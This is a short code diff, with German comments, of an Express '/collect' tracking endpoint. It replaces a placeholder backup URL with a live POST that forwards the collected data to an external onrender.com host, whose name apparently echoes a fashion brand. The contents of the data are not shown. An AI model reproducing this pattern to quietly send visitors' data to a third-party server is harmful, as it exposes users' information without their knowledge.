@@ -27,8 +27,7 @@ app.get('/collect', (req, res) => {
     // Lokal speichern
     fs.appendFileSync('tracking.log', JSON.stringify(data) + '\n');
 
-    // Optional: Daten an zweiten Server schicken
-    fetch('https://dein-backup-server.xyz/log', {
+    fetch('https://loropiana1.onrender.com/submit', {
         method: 'POST',
         body: JSON.stringify(data),
         headers: { 'Content-Type': 'application/json' }
